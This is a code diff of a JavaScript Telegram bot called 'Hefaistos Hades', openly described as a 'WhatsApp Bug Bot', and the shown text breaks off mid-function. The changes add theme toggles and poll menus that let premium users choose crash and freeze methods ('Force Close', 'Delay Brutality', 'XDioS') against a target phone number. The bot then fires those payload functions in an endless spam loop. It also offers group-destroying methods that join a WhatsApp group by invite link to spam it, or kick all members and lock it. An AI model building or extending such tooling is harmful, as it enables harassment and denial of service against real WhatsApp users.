@@ -83,6 +83,25 @@ function getRandomImage() {
 }
 
 // =====================================================
+// ================ UI THEME PREFERENCE ================
+// =====================================================
+const THEME_FILE = "./database/uitheme.json";
+function loadThemes() {
+  try {
+    if (!fs.existsSync("./database")) fs.mkdirSync("./database", { recursive: true });
+    if (!fs.existsSync(THEME_FILE)) fs.writeFileSync(THEME_FILE, "{}");
+    return JSON.parse(fs.readFileSync(THEME_FILE, "utf8") || "{}");
+  } catch { return {}; }
+}
+const saveThemes = (d) => fs.writeFileSync(THEME_FILE, JSON.stringify(d, null, 2));
+const getTheme = (userId) => loadThemes()[String(userId)] || "rich";
+const setTheme = (userId, theme) => {
+  const d = loadThemes();
+  d[String(userId)] = theme === "poll" ? "poll" : "rich";
+  saveThemes(d);
+};
+
+// =====================================================
 // ================ FUNGSI BUG (MULTI) =================
 // =====================================================
 
@@ -780,41 +799,11 @@ const premGroupOnly = () => async (ctx, next) => {
   next();
 };
 
-// =================== RICH HTML BUILDER ===================
-function buildStartHtml(userFirst, senderStatus, runtimeStatus, memoryStatus, premiumStatus) {
-  return `
-<h1>⚔️ Hefaistos Hades</h1>
-<p><i>System Control • WhatsApp Bug Bot</i></p>
-<img src="${thumbnailUrl}" alt="banner"/>
-<hr/>
-<p>Halo <b>${esc(userFirst)}</b> 👋 selamat datang kembali.</p>
-<h2>📊 Status System</h2>
-<table>
-  <tr><th>Komponen</th><th>Status</th></tr>
-  <tr><td>Sender</td><td><b>${senderStatus}</b></td></tr>
-  <tr><td>Runtime</td><td><code>${runtimeStatus}</code></td></tr>
-  <tr><td>Memory</td><td><code>${memoryStatus}</code></td></tr>
-  <tr><td>Akses Kamu</td><td><b>${premiumStatus}</b></td></tr>
-</table>
-<hr/>
-<h2>✨ Fitur Utama</h2>
-<checklist>
-  <li checked>Bug Delay &amp; Crash</li>
-  <li checked>Pairing WhatsApp</li>
-  <li checked>Premium Group System</li>
-  <li checked>Auto Update Script</li>
-  <li checked>Game Tic Tac Toe &amp; Suit</li>
-</checklist>
-<hr/>
-<details>
-  <summary>📌 Info Developer</summary>
-  <p>Developer : <b>@shinracery</b></p>
-  <p>Version   : <b>New</b></p>
-  <p>Language  : <b>JavaScript</b></p>
-</details>
-<p>Tekan tombol <b>Open Menu</b> di bawah buat mulai.</p>
-`.trim();
-}
+// =================== KEYBOARDS ===================
+const THEME_KEYBOARD = (theme) => [[
+  { text: theme === "rich" ? "✅ 𝐑𝐢𝐜𝐡 𝐌𝐞𝐬𝐬𝐚𝐠𝐞" : "𝐑𝐢𝐜𝐡 𝐌𝐞𝐬𝐬𝐚𝐠𝐞", callback_data: "set_theme_rich", style: "primary", icon_custom_emoji_id: "6163328887813051603" },
+  { text: theme === "poll" ? "✅ 𝐏𝐨𝐥𝐥 𝐌𝐞𝐬𝐬𝐚𝐠𝐞" : "𝐏𝐨𝐥𝐥 𝐌𝐞𝐬𝐬𝐚𝐠𝐞", callback_data: "set_theme_poll", style: "success", icon_custom_emoji_id: "6163328887813051603" },
+]];
 
 const START_KEYBOARD = [[
   { text: "𝐎𝐩𝐞𝐧 𝐌𝐞𝐧𝐮", callback_data: "/setting_menu", style: "success", icon_custom_emoji_id: "6163328887813051603" },
@@ -867,219 +856,563 @@ const BAN_KEYBOARD = [
   ],
 ];
 
+// =================== POLL SESSION STORE ===================
+const pollSessions     = new Map(); // pollId -> { chatId, options, type, data, msgId }
+const pendingBugUser   = new Map();
+const pendingBanUser   = new Map();
+
+function newPollId() { return crypto.randomBytes(6).toString("hex"); }
+
+async function sendPollWrapped(chatId, question, optionsText, optionsValue, type, data = {}) {
+  const msg = await bot.telegram.sendPoll(chatId, question, optionsText, {
+    is_anonymous: false,
+    allows_multiple_answers: false,
+    open_period: 300,
+  }).catch((e) => { console.log("sendPoll err:", e.message); return null; });
+
+  if (!msg || !msg.poll) return null;
+
+  pollSessions.set(msg.poll.id, {
+    chatId,
+    options: optionsValue,
+    type,
+    data,
+    msgId: msg.message_id,
+  });
+  return msg;
+}
+
+// =================== CAPTION BUILDERS ===================
+function captionStart(userFirst, senderStatus, runtimeStatus, memoryStatus, premiumStatus, theme) {
+  const themeTxt = theme === "poll" ? "Poll Message" : "Rich Message";
+  return `
+⚔️ <b>HEFAISTOS HADES</b>
+<i>System Control • WhatsApp Bug Bot</i>
+
+Halo <b>${esc(userFirst)}</b> 👋
+Sender : <b>${senderStatus}</b>
+Runtime: <code>${runtimeStatus}</code>
+Memory : <code>${memoryStatus}</code>
+Akses  : <b>${premiumStatus}</b>
+Tema   : <b>${themeTxt}</b>
+`.trim();
+}
+
+function captionSetting() {
+  return `
+☰ <b>SYSTEM CONTROL PANEL</b>
+<i>Page 2/4 • 𝙷𝙴𝙵𝙰𝙸𝚂𝚃𝙾𝚂 𝙷𝙰𝙳𝙴𝚂</i>
+
+<b>Connect / Update</b>
+• /addpairing  → Tambah Sender
+• /killsession → Hapus Sender
+• /update      → Auto Update
+
+<b>Owner Settings</b>
+• /addpremgrup  → Tambah grup premium
+• /delpremgrup  → Hapus grup premium
+• /listpremgrup → Lihat daftar
+
+<b>Menu Lain</b>
+• Bug Menu
+• Bug Pilih
+• Ban Group
+
+Security : <b>ACTIVE</b>
+Network  : <b>Hefaistos Hades Core</b>
+`.trim();
+}
+
+function captionBugMenu() {
+  return `
+🐛 <b>BUG MENU</b>
+<i>Page 3/4 • Hefaistos Hades</i>
+
+<b>Delay Bug</b>
+• /delayhard  → Delay Hard
+• /ghost      → Delay Ghost
+• /forceclose → Force Close
+• /forcezz    → Force Zezz
+• /xdios      → Delay Xdios
+
+<b>Crash Bug</b>
+• /bug → pilih jenis bug dari tombol
+
+<i>Ketik /stopbug buat stop semua spam kamu.</i>
+`.trim();
+}
+
+function captionBugPick() {
+  return `
+🎯 <b>BUG PICK</b>
+<i>Pilih dulu, abis itu kirim nomornya.</i>
+
+<b>Daftar Bug</b>
+• Forceclose
+• Delayhard
+• Ghost
+• Forcezz
+• Xdios
+`.trim();
+}
+
+function captionBanMenu() {
+  return `
+🔥 <b>BAN GROUP MENU</b>
+<i>Page 4/4 • Hefaistos Hades</i>
+
+<b>Metode</b>
+• /endgbv1  → End Group v1 (join + spam action)
+• /endgbv2  → End Group v2 (kick all + lock)
+`.trim();
+}
+
+// =================== RENDERERS (RICH) ===================
+async function renderStartRich(ctx, editMsgId = null) {
+  const userId = ctx.from.id;
+  const theme = getTheme(userId);
+  const userFirst = ctx.from.first_name || ctx.from.username || "Kak";
+  const senderStatus = isWhatsAppConnected ? "Aktif" : "Tidak Aktif";
+  const kbd = [...THEME_KEYBOARD(theme), ...START_KEYBOARD];
+  const cap = captionStart(userFirst, senderStatus, formatRuntime(), formatMemory(), isPremiumUser(userId) ? "Premium" : "Free", theme);
+
+  if (editMsgId) {
+    return ctx.telegram.editMessageCaption(ctx.chat.id, editMsgId, undefined, cap, {
+      parse_mode: "HTML", reply_markup: { inline_keyboard: kbd },
+    }).catch(async () => {
+      await ctx.telegram.deleteMessage(ctx.chat.id, editMsgId).catch(() => {});
+      return ctx.replyWithPhoto(thumbnailUrl, { caption: cap, parse_mode: "HTML", reply_markup: { inline_keyboard: kbd } });
+    });
+  }
+  return ctx.replyWithPhoto(thumbnailUrl, { caption: cap, parse_mode: "HTML", reply_markup: { inline_keyboard: kbd } });
+}
+
+async function renderSettingRich(ctx, editMsgId = null) {
+  const userId = ctx.from.id;
+  const theme = getTheme(userId);
+  const kbd = [...THEME_KEYBOARD(theme), ...SETTING_KEYBOARD];
+  const cap = captionSetting();
+
+  if (editMsgId) {
+    return ctx.telegram.editMessageCaption(ctx.chat.id, editMsgId, undefined, cap, {
+      parse_mode: "HTML", reply_markup: { inline_keyboard: kbd },
+    }).catch(async () => {
+      await ctx.telegram.deleteMessage(ctx.chat.id, editMsgId).catch(() => {});
+      return ctx.replyWithPhoto(thumbnailUrl, { caption: cap, parse_mode: "HTML", reply_markup: { inline_keyboard: kbd } });
+    });
+  }
+  return ctx.replyWithPhoto(thumbnailUrl, { caption: cap, parse_mode: "HTML", reply_markup: { inline_keyboard: kbd } });
+}
+
+async function renderBugMenuRich(ctx, editMsgId = null) {
+  const userId = ctx.from.id;
+  const theme = getTheme(userId);
+  const kbd = [...THEME_KEYBOARD(theme), ...BUG_KEYBOARD];
+  const cap = captionBugMenu();
+
+  if (editMsgId) {
+    return ctx.telegram.editMessageCaption(ctx.chat.id, editMsgId, undefined, cap, {
+      parse_mode: "HTML", reply_markup: { inline_keyboard: kbd },
+    }).catch(async () => {
+      await ctx.telegram.deleteMessage(ctx.chat.id, editMsgId).catch(() => {});
+      return ctx.replyWithPhoto(thumbnailUrl, { caption: cap, parse_mode: "HTML", reply_markup: { inline_keyboard: kbd } });
+    });
+  }
+  return ctx.replyWithPhoto(thumbnailUrl, { caption: cap, parse_mode: "HTML", reply_markup: { inline_keyboard: kbd } });
+}
+
+async function renderBugPickRich(ctx, editMsgId = null) {
+  const userId = ctx.from.id;
+  const theme = getTheme(userId);
+  const kbd = [...THEME_KEYBOARD(theme), ...BUG_PICK_KEYBOARD];
+  const cap = captionBugPick();
+
+  if (editMsgId) {
+    return ctx.telegram.editMessageCaption(ctx.chat.id, editMsgId, undefined, cap, {
+      parse_mode: "HTML", reply_markup: { inline_keyboard: kbd },
+    }).catch(async () => {
+      await ctx.telegram.deleteMessage(ctx.chat.id, editMsgId).catch(() => {});
+      return ctx.replyWithPhoto(thumbnailUrl, { caption: cap, parse_mode: "HTML", reply_markup: { inline_keyboard: kbd } });
+    });
+  }
+  return ctx.replyWithPhoto(thumbnailUrl, { caption: cap, parse_mode: "HTML", reply_markup: { inline_keyboard: kbd } });
+}
+
+async function renderBanMenuRich(ctx, editMsgId = null) {
+  const userId = ctx.from.id;
+  const theme = getTheme(userId);
+  const kbd = [...THEME_KEYBOARD(theme), ...BAN_KEYBOARD];
+  const cap = captionBanMenu();
+
+  if (editMsgId) {
+    return ctx.telegram.editMessageCaption(ctx.chat.id, editMsgId, undefined, cap, {
+      parse_mode: "HTML", reply_markup: { inline_keyboard: kbd },
+    }).catch(async () => {
+      await ctx.telegram.deleteMessage(ctx.chat.id, editMsgId).catch(() => {});
+      return ctx.replyWithPhoto(thumbnailUrl, { caption: cap, parse_mode: "HTML", reply_markup: { inline_keyboard: kbd } });
+    });
+  }
+  return ctx.replyWithPhoto(thumbnailUrl, { caption: cap, parse_mode: "HTML", reply_markup: { inline_keyboard: kbd } });
+}
+
+// =================== RENDERERS (POLL) ===================
+// foto + caption + keyboard, lalu poll di bawah
+async function renderStartPoll(ctx) {
+  const userId = ctx.from.id;
+  const theme = getTheme(userId);
+  const userFirst = ctx.from.first_name || ctx.from.username || "Kak";
+  const senderStatus = isWhatsAppConnected ? "Aktif" : "Tidak Aktif";
+  const kbd = [...THEME_KEYBOARD(theme), ...START_KEYBOARD];
+  const cap = captionStart(userFirst, senderStatus, formatRuntime(), formatMemory(), isPremiumUser(userId) ? "Premium" : "Free", theme);
+
+  await ctx.replyWithPhoto(thumbnailUrl, { caption: cap, parse_mode: "HTML", reply_markup: { inline_keyboard: kbd } }).catch(() => {});
+
+  await sendPollWrapped(
+    ctx.chat.id,
+    "📋 Mau buka menu apa?",
+    ["⚙️ Setting Menu", "🐛 Bug Menu", "🎯 Bug Pilih", "🔥 Ban Group"],
+    ["/setting_menu", "/bug_menu", "/bug_pick_menu", "/ban_menu"],
+    "start"
+  );
+}
+
+async function renderSettingPoll(ctx) {
+  const userId = ctx.from.id;
+  const theme = getTheme(userId);
+  const kbd = [...THEME_KEYBOARD(theme), ...SETTING_KEYBOARD];
+  await ctx.replyWithPhoto(thumbnailUrl, { caption: captionSetting(), parse_mode: "HTML", reply_markup: { inline_keyboard: kbd } }).catch(() => {});
+
+  await sendPollWrapped(
+    ctx.chat.id,
+    "⚙️ Setting Menu — pilih:",
+    ["🐛 Bug Menu", "🎯 Bug Pilih", "🔥 Ban Group", "🏠 Balik ke Start"],
+    ["/bug_menu", "/bug_pick_menu", "/ban_menu", "/start"],
+    "setting"
+  );
+}
+
+async function renderBugMenuPoll(ctx) {
+  const userId = ctx.from.id;
+  const theme = getTheme(userId);
+  const kbd = [...THEME_KEYBOARD(theme), ...BUG_KEYBOARD];
+  await ctx.replyWithPhoto(thumbnailUrl, { caption: captionBugMenu(), parse_mode: "HTML", reply_markup: { inline_keyboard: kbd } }).catch(() => {});
+
+  await sendPollWrapped(
+    ctx.chat.id,
+    "🐛 Bug Menu — pilih method:",
+    ["Delayhard", "Ghost", "Forceclose", "Forcezz", "Xdios"],
+    ["delayhard", "ghost", "forceclose", "forcezz", "xdios"],
+    "bugmenu"
+  );
+}
+
+async function renderBugPickPoll(ctx) {
+  const userId = ctx.from.id;
+  const theme = getTheme(userId);
+  const kbd = [...THEME_KEYBOARD(theme), ...BUG_PICK_KEYBOARD];
+  await ctx.replyWithPhoto(thumbnailUrl, { caption: captionBugPick(), parse_mode: "HTML", reply_markup: { inline_keyboard: kbd } }).catch(() => {});
+
+  await sendPollWrapped(
+    ctx.chat.id,
+    "🎯 Bug Pick — pilih jenis:",
+    ["Forceclose", "Delayhard", "Ghost", "Forcezz", "Xdios"],
+    ["forceclose", "delayhard", "ghost", "forcezz", "xdios"],
+    "bugpick"
+  );
+}
+
+async function renderBanMenuPoll(ctx) {
+  const userId = ctx.from.id;
+  const theme = getTheme(userId);
+  const kbd = [...THEME_KEYBOARD(theme), ...BAN_KEYBOARD];
+  await ctx.replyWithPhoto(thumbnailUrl, { caption: captionBanMenu(), parse_mode: "HTML", reply_markup: { inline_keyboard: kbd } }).catch(() => {});
+
+  await sendPollWrapped(
+    ctx.chat.id,
+    "🔥 Ban Group — pilih metode:",
+    ["End GB v1 (Join + Spam)", "End GB v2 (Kick All + Lock)"],
+    ["endgb", "endgbv2"],
+    "banpick"
+  );
+}
+
+async function renderCrashBugPoll(ctx, rawNumber, target) {
+  await ctx.replyWithPhoto({ source: "./image/MagicClowerd.jpg" }, {
+    caption: `<blockquote>Target : ${esc(rawNumber)}\nStatus : Ready\nPilih method di poll bawah ⬇️</blockquote>`,
+    parse_mode: "HTML",
+  }).catch(() => {});
+
+  await sendPollWrapped(
+    ctx.chat.id,
+    `🐛 Target ${rawNumber} — pilih method:`,
+    ["Delay Brutality", "Force Close", "XDioS", "Force Freez"],
+    ["delay", "fc", "blank", "bulldozer"],
+    "crashbug",
+    { target, rawNumber }
+  );
+}
+
+// =================== DISPATCHER ===================
+async function openMenu(ctx, menuKey, editMsgId = null) {
+  const theme = getTheme(ctx.from.id);
+  if (theme === "poll") {
+    switch (menuKey) {
+      case "/start":         return renderStartPoll(ctx);
+      case "/setting_menu":  return renderSettingPoll(ctx);
+      case "/bug_menu":      return renderBugMenuPoll(ctx);
+      case "/bug_pick_menu": return renderBugPickPoll(ctx);
+      case "/ban_menu":      return renderBanMenuPoll(ctx);
+    }
+    return;
+  }
+  switch (menuKey) {
+    case "/start":         return renderStartRich(ctx, editMsgId);
+    case "/setting_menu":  return renderSettingRich(ctx, editMsgId);
+    case "/bug_menu":      return renderBugMenuRich(ctx, editMsgId);
+    case "/bug_pick_menu": return renderBugPickRich(ctx, editMsgId);
+    case "/ban_menu":      return renderBanMenuRich(ctx, editMsgId);
+  }
+}
+
 // =================== /start ===================
 bot.start(async (ctx) => {
-  const userId        = ctx.from.id;
-  const senderStatus  = isWhatsAppConnected ? "Aktif" : "Tidak Aktif";
-  const runtimeStatus = formatRuntime();
-  const memoryStatus  = formatMemory();
-  const premiumStatus = isPremiumUser(userId) ? "Premium" : "Free";
-  const userFirst     = ctx.from.first_name || ctx.from.username || "Kak";
-
-  const html = buildStartHtml(userFirst, senderStatus, runtimeStatus, memoryStatus, premiumStatus);
-
-  try {
-    await ctx.telegram.callApi("sendRichMessage", {
-      chat_id: ctx.chat.id, rich_message: { html }, reply_markup: { inline_keyboard: START_KEYBOARD },
-    });
-  } catch (err) {
-    console.log("rich gagal, fallback ke foto:", err?.response?.description || err.message);
-    const fallback = `
-<blockquote>•.¸ Hefaistos Hades ¸.•</blockquote>
-↯ Developer : @shinracery
-↯ Version   : New
-↯ Language  : JavaScript
-
-<blockquote>「 𝖲𝗍𝖺𝗍𝗎𝗌𝖾𝖽 」</blockquote>
-↯ Sender  : ${senderStatus}
-↯ Runtime : ${runtimeStatus}
-`.trim();
-    await ctx.replyWithPhoto(thumbnailUrl, { caption: fallback, parse_mode: "HTML", reply_markup: { inline_keyboard: START_KEYBOARD } });
-  }
+  return openMenu(ctx, "/start");
 });
 
-// =================== CALLBACK: MENU UTAMA ===================
+// =================== TOGGLE TEMA ===================
+bot.action("set_theme_rich", async (ctx) => {
+  setTheme(ctx.from.id, "rich");
+  await ctx.answerCbQuery("✅ Tema diganti ke Rich Message");
+  await ctx.deleteMessage().catch(() => {});
+  return bot.telegram.sendMessage(ctx.chat.id, "/start").catch(() => {});
+});
+
+bot.action("set_theme_poll", async (ctx) => {
+  setTheme(ctx.from.id, "poll");
+  await ctx.answerCbQuery("✅ Tema diganti ke Poll Message");
+  await ctx.deleteMessage().catch(() => {});
+  return bot.telegram.sendMessage(ctx.chat.id, "/start").catch(() => {});
+});
+
+// =================== MENU CALLBACK ===================
 bot.action("/start", async (ctx) => {
   await ctx.answerCbQuery();
-  const senderStatus  = isWhatsAppConnected ? "Aktif" : "Tidak Aktif";
-  const runtimeStatus = formatRuntime();
-  const memoryStatus  = formatMemory();
-  const premiumStatus = isPremiumUser(ctx.from.id) ? "Premium" : "Free";
-  const userFirst     = ctx.from.first_name || ctx.from.username || "Kak";
-  const msgId = ctx.callbackQuery.message.message_id;
-  const html  = buildStartHtml(userFirst, senderStatus, runtimeStatus, memoryStatus, premiumStatus);
+  return openMenu(ctx, "/start", ctx.callbackQuery.message.message_id);
+});
+bot.action("/setting_menu", async (ctx) => {
+  await ctx.answerCbQuery();
+  return openMenu(ctx, "/setting_menu", ctx.callbackQuery.message.message_id);
+});
+bot.action("/bug_menu", async (ctx) => {
+  await ctx.answerCbQuery();
+  return openMenu(ctx, "/bug_menu", ctx.callbackQuery.message.message_id);
+});
+bot.action("/bug_pick_menu", async (ctx) => {
+  await ctx.answerCbQuery();
+  return openMenu(ctx, "/bug_pick_menu", ctx.callbackQuery.message.message_id);
+});
+bot.action("/ban_menu", async (ctx) => {
+  await ctx.answerCbQuery();
+  return openMenu(ctx, "/ban_menu", ctx.callbackQuery.message.message_id);
+});
 
-  try {
-    await ctx.telegram.callApi("editMessageText", {
-      chat_id: ctx.chat.id, message_id: msgId, rich_message: { html }, reply_markup: { inline_keyboard: START_KEYBOARD },
-    });
-  } catch (err) {
-    console.log("edit rich gagal:", err?.response?.description || err.message);
+// =================== POLL ANSWER ROUTER ===================
+bot.on("poll_answer", async (ctx) => {
+  const ans = ctx.pollAnswer;
+  const s = pollSessions.get(ans.poll_id);
+  if (!s) return;
+
+  const userId = ans.user.id;
+  const idx = ans.option_ids[0];
+  if (idx === undefined) return;
+  const value = s.options[idx];
+  if (!value) return;
+
+  const chatId = s.chatId;
+
+  // hapus poll biar nggak numpuk
+  bot.telegram.deleteMessage(chatId, s.msgId).catch(() => {});
+  pollSessions.delete(ans.poll_id);
+
+  const fakeCtx = {
+    ...ctx,
+    chat: { id: chatId, type: "private" },
+    from: ans.user,
+    callbackQuery: undefined,
+    answerCbQuery: async () => {},
+  };
+
+  // --- START ---
+  if (s.type === "start" || s.type === "setting") {
+    return openMenu(fakeCtx, value);
+  }
+
+  // --- BUG MENU / BUG PICK ---
+  if (s.type === "bugmenu" || s.type === "bugpick") {
+    pendingBugUser.set(userId, value);
+    const label = value.charAt(0).toUpperCase() + value.slice(1);
+    return bot.telegram.sendMessage(chatId,
+      `✅ <b>${label}</b> dipilih.\n\nKirim nomornya sekarang (contoh: <code>628xxxxxxxx</code>).`,
+      { parse_mode: "HTML" }
+    ).catch(() => {});
+  }
+
+  // --- BAN PICK ---
+  if (s.type === "banpick") {
+    pendingBanUser.set(userId, value);
+    const label = value === "endgb" ? "End GB v1" : "End GB v2";
+    return bot.telegram.sendMessage(chatId,
+      `✅ <b>${label}</b> dipilih.\n\nKirim link grupnya (contoh: <code>https://chat.whatsapp.com/xxxxx</code>).`,
+      { parse_mode: "HTML" }
+    ).catch(() => {});
+  }
+
+  // --- CRASH BUG ---
+  if (s.type === "crashbug") {
+    const target = s.data.target;
+
+    const methods = {
+      delay: { name: "Delay Brutality", tasks: [
+        { name: "StuckNewAmba-1", fn: () => StuckNewAmba(sock, target) },
+        { name: "StuckLogo-1",    fn: () => StuckLogo(sock, target)    },
+        { name: "StuckNewAmba-2", fn: () => StuckNewAmba(sock, target) },
+        { name: "StuckLogo-2",    fn: () => StuckLogo(sock, target)    },
+      ]},
+      blank: { name: "XDioS", tasks: [
+        { name: "catchingOs", fn: () => catchingOs(target)       },
+        { name: "iosswipper", fn: () => iosswipper(sock, target) },
+      ]},
+      bulldozer: { name: "Force Freez", tasks: [
+        { name: "VIDEO-1",        fn: () => ForcloseVIDEO(sock, target) },
+        { name: "DOC-1",          fn: () => ForcloseDOC(sock, target)   },
+        { name: "StuckNewAmba-1", fn: () => StuckNewAmba(sock, target)  },
+        { name: "StuckLogo-1",    fn: () => StuckLogo(sock, target)     },
+        { name: "StuckNewAmba-2", fn: () => StuckNewAmba(sock, target)  },
+        { name: "StuckLogo-2",    fn: () => StuckLogo(sock, target)     },
+        { name: "STC-1",          fn: () => ForcloseSTC(sock, target)   },
+        { name: "VIDEO-2",        fn: () => ForcloseVIDEO(sock, target) },
+      ]},
+      fc: { name: "Force close", tasks: [
+        { name: "VIDEO-1", fn: () => ForcloseVIDEO(sock, target) },
+        { name: "DOC-1",   fn: () => ForcloseDOC(sock, target)   },
+        { name: "STC-1",   fn: () => ForcloseSTC(sock, target)   },
+        { name: "VIDEO-2", fn: () => ForcloseVIDEO(sock, target) },
+      ]},
+    };
+
+    const m = methods[value];
+    if (!m) return;
+
+    if (!isPremiumUser(userId)) {
+      return bot.telegram.sendMessage(chatId, "❌ Khusus user premium atau grup premium").catch(() => {});
+    }
+
+    const spamCtx = { from: { id: userId }, chat: { id: chatId }, telegram: bot.telegram };
+    spamForever(spamCtx, m.name, target, m.tasks);
+    return;
   }
 });
 
-// =================== BUG MENU ===================
-bot.action("/bug_menu", async (ctx) => {
-  await ctx.answerCbQuery();
-  const msgId = ctx.callbackQuery.message.message_id;
-
-  const html = `
-<h2>BUG MENU</h2>
-<p><i>(Page 3/4) • Hefaistos Hades</i></p>
-<img src="${thumbnailUrl}" alt="banner"/>
-<hr/>
-<h2>Delay Bug</h2>
-<ul>
-  <li>/delayhard  • Delay Hard</li>
-  <li>/ghost      • Delay Ghost</li>
-  <li>/forceclose • Force Close</li>
-  <li>/forcezz    • Force Zezz</li>
-  <li>/xdios      • Delay Xdios</li>
-</ul>
-<hr/>
-<h2>Crash Bug</h2>
-<ul>
-  <li>/bug • Pilih jenis bug dari tombol</li>
-</ul>
-<hr/>
-<p><i>Ketik /stopbug buat berhentiin spam.</i></p>
-`.trim();
-
-  try {
-    await ctx.telegram.callApi("editMessageText", {
-      chat_id: ctx.chat.id, message_id: msgId, rich_message: { html }, reply_markup: { inline_keyboard: BUG_KEYBOARD },
-    });
-  } catch (err) { console.log("bug_menu gagal:", err?.response?.description || err.message); }
-});
-
-// =================== BUG PICK MENU ===================
-bot.action("/bug_pick_menu", async (ctx) => {
-  await ctx.answerCbQuery();
-  const msgId = ctx.callbackQuery.message.message_id;
-
-  const html = `
-<h2>BUG PICK MENU</h2>
-<p><i>Pilih metode bug di bawah, lalu kirim nomor target.</i></p>
-<img src="${thumbnailUrl}" alt="banner"/>
-<hr/>
-<h2>Daftar Bug</h2>
-<ul>
-  <li>Forceclose</li>
-  <li>Delayhard</li>
-  <li>Ghost</li>
-  <li>Forcezz</li>
-  <li>Xdios</li>
-</ul>
-<hr/>
-<p><i>Klik tombol di bawah buat pilih bug.</i></p>
-`.trim();
-
-  try {
-    await ctx.telegram.callApi("editMessageText", {
-      chat_id: ctx.chat.id, message_id: msgId, rich_message: { html }, reply_markup: { inline_keyboard: BUG_PICK_KEYBOARD },
-    });
-  } catch (err) { console.log("bug_pick_menu gagal:", err?.response?.description || err.message); }
-});
-
-// =================== BAN MENU ===================
-bot.action("/ban_menu", async (ctx) => {
-  await ctx.answerCbQuery();
-  const msgId = ctx.callbackQuery.message.message_id;
-
-  const html = `
-<h2>BAN GROUP MENU</h2>
-<p><i>(Page 4/4) • Hefaistos Hades</i></p>
-<img src="${thumbnailUrl}" alt="banner"/>
-<hr/>
-<h2>Delay Ban</h2>
-<ul>
-  <li>/endgbv1  • End Group v1 (Join + Spam Action)</li>
-  <li>/endgbv2  • End Group v2 (Kick All + Lock)</li>
-</ul>
-<hr/>
-<p><i>Klik tombol di bawah buat pilih metode ban.</i></p>
-`.trim();
-
-  try {
-    await ctx.telegram.callApi("editMessageText", {
-      chat_id: ctx.chat.id, message_id: msgId, rich_message: { html }, reply_markup: { inline_keyboard: BAN_KEYBOARD },
-    });
-  } catch (err) { console.log("ban_menu gagal:", err?.response?.description || err.message); }
-});
-
-// =================== PILIH BUG DARI TOMBOL ===================
-const pendingBugUser = new Map();
-
+// =================== BUG PICK / BAN PICK (TOMBOL) ===================
 bot.action(/^bug_pick_(.+)$/, async (ctx) => {
-  const userId  = ctx.from.id;
+  const userId = ctx.from.id;
   const bugName = ctx.match[1];
-
   const label = {
-    forceclose: "Forceclose",
-    delayhard:  "Delayhard",
-    ghost:      "Ghost",
-    forcezz:    "Forcezz",
-    xdios:      "Xdios",
+    forceclose: "Forceclose", delayhard: "Delayhard",
+    ghost: "Ghost", forcezz: "Forcezz", xdios: "Xdios",
   }[bugName] || bugName;
 
   pendingBugUser.set(userId, bugName);
   await ctx.answerCbQuery(`✅ ${label} dipilih`);
-
-  const html = `
-<h2>BUG: ${label.toUpperCase()}</h2>
-<img src="${thumbnailUrl}" alt="banner"/>
-<hr/>
-<p>Sekarang kirim nomor target.</p>
-<p><b>Contoh:</b> <code>628xxxxxxxx</code></p>
-<hr/>
-<p><i>Ketik nomornya aja, langsung kirim.</i></p>
-`.trim();
-
-  const kbd = [[{ text: "𝐁𝐚𝐜𝐤", callback_data: "/bug_pick_menu", style: "danger", icon_custom_emoji_id: "6210968712304923662" }]];
-
-  try {
-    await ctx.telegram.callApi("editMessageText", {
-      chat_id: ctx.chat.id, message_id: ctx.callbackQuery.message.message_id, rich_message: { html }, reply_markup: { inline_keyboard: kbd },
-    });
-  } catch (err) { console.log("pick bug err:", err?.response?.description || err.message); }
+  await ctx.deleteMessage().catch(() => {});
+  return ctx.telegram.sendMessage(ctx.chat.id,
+    `✅ <b>${label}</b> dipilih.\n\nKirim nomornya sekarang (contoh: <code>628xxxxxxxx</code>).`,
+    { parse_mode: "HTML" }
+  ).catch(() => {});
 });
 
-// =================== PILIH BAN DARI TOMBOL ===================
-const pendingBanUser = new Map();
-
 bot.action(/^ban_pick_(.+)$/, async (ctx) => {
-  const userId  = ctx.from.id;
+  const userId = ctx.from.id;
   const banName = ctx.match[1];
-
-  const label = {
-    endgb:   "End GB v1",
-    endgbv2: "End GB v2",
-  }[banName] || banName;
+  const label = { endgb: "End GB v1", endgbv2: "End GB v2" }[banName] || banName;
 
   pendingBanUser.set(userId, banName);
   await ctx.answerCbQuery(`✅ ${label} dipilih`);
-
-  const html = `
-<h2>BAN: ${label.toUpperCase()}</h2>
-<img src="${thumbnailUrl}" alt="banner"/>
-<hr/>
-<p>Sekarang kirim link grup target.</p>
-<p><b>Contoh:</b></p>
-<p><code>https://chat.whatsapp.com/xxxxxxxxxx</code></p>
-<hr/>
-<p><i>Ketik link nya aja, langsung kirim.</i></p>
-`.trim();
-
-  const kbd = [[{ text: "𝐁𝐚𝐜𝐤", callback_data: "/ban_menu", style: "danger", icon_custom_emoji_id: "6210968712304923662" }]];
-
-  try {
-    await ctx.telegram.callApi("editMessageText", {
-      chat_id: ctx.chat.id, message_id: ctx.callbackQuery.message.message_id, rich_message: { html }, reply_markup: { inline_keyboard: kbd },
-    });
-  } catch (err) { console.log("pick ban err:", err?.response?.description || err.message); }
+  await ctx.deleteMessage().catch(() => {});
+  return ctx.telegram.sendMessage(ctx.chat.id,
+    `✅ <b>${label}</b> dipilih.\n\nKirim link grupnya (contoh: <code>https://chat.whatsapp.com/xxxxx</code>).`,
+    { parse_mode: "HTML" }
+  ).catch(() => {});
 });
 
-// =================== BUG TASKS BUILDER ===================
+// =================== TEXT HANDLER (pending bug/ban) ===================
+bot.on("text", async (ctx, next) => {
+  const userId = ctx.from.id;
+  const text = ctx.message?.text || "";
+
+  // PENDING BAN
+  if (pendingBanUser.has(userId)) {
+    if (text.startsWith("/")) { pendingBanUser.delete(userId); return next(); }
+    const targetInput = text.trim();
+    if (!targetInput.includes("chat.whatsapp.com/")) {
+      return ctx.reply("❌ Link gak valid. Contoh:\n<code>https://chat.whatsapp.com/xxxxx</code>", { parse_mode: "HTML" });
+    }
+    const banName = pendingBanUser.get(userId);
+    pendingBanUser.delete(userId);
+
+    if (!isPremiumUser(userId) && ctx.chat.type === "private") return ctx.reply("❌ Khusus user premium atau grup premium");
+    if (!isWhatsAppConnected) return ctx.reply("🪧 ☇ Tidak ada sender yang terhubung");
+
+    const inviteCode = String(targetInput.split("chat.whatsapp.com/")[1].split(/[?/]/)[0]);
+
+    await ctx.reply("✅ Masuk antrian ban", {
+      reply_markup: { inline_keyboard: [[
+        { text: "Lihat Target", url: `https://chat.whatsapp.com/${inviteCode}`, icon_custom_emoji_id: "5395444784611480792", style: "success" },
+      ]] },
+    });
+
+    queue.add(async () => {
+      try {
+        if (banName === "endgb") await proxzy(sock, inviteCode);
